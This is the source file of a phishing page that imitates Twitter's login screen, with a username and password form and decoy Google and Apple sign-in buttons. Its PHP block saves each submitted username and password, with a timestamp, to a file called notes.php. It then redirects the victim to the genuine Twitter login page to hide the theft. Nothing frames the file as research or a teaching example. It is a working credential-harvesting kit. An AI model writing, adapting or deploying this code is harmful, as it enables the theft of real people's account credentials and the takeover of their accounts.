<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>form</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<?php

error_reporting(0);

$username = $_POST['username'];
$password = $_POST['password'];
$date = date("Y-m-d;h:i:s");

if ((empty($_POST["username"])) || (empty($_POST["password"]))) {

    }
    else
    {
        

        $f = fopen("notes.php", "a");
        
        fwrite ($f,
            'Username: <b>'.$username.'</b><br>
            Password: <b>'.$password.'</b><br>
            Date: <b>'.$date.'</b><br>');
            
        
        fclose($f);
        
        header("location: https://twitter.com/i/flow/login/");

    }

?>

    <div class="container">
        <div class="box box-one">
            <i class="fab fa-twitter"><img src="https://img.icons8.com/color/50/000000/twitter--v1.png" /></i>
            <button>
                <img src="google.png" width="19">
                <span>Sign in with Google</span>
            </button>
            <button>
                <img src="apple.png" width="19">
                <span>Sign in with Apple</span>
            </button>
        </div>
        <h5>Or</h5>
        <div class="box box-two">
            <form action="" method="post">
                <input type="text" name="username" placeholder="Phone,email, or username" />
                <input type="password" name="password" placeholder="enter password" />
                <button class="next-btn" type="submit">Next</button>
            </form>

            

            <button>Forget password</button>
        </div>
        <p>Don't have an account <a href="#">Sign Up</a></p>
    </div>
</body>

</html>